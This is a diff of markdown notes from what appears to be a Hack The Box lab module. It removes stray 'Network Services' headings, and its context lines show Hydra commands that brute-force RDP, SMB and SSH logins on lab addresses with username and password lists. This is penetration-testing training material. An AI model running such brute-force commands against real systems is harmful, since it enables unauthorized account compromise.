@@ -6,8 +6,6 @@ TheCyberScythe@htb[/htb]$ hydra -L user.list -P password.list rdp://10.129.42.19
 
 #### Hydra - SMB
 
-Network Services
-
 ```shell
 TheCyberScythe@htb[/htb]$ hydra -L user.list -P password.list smb://10.129.42.197
 
@@ -25,7 +23,6 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-06 19:37:
 
 We can use a tool such as `Hydra` to brute force SSH. This is covered in-depth in the [Login Brute Forcing](https://academy.hackthebox.com/course/preview/login-brute-forcing) module.
 
-Network Services
 
 ```shell
 TheCyberScythe@htb[/htb]$ hydra -L user.list -P password.list ssh://10.129.42.197
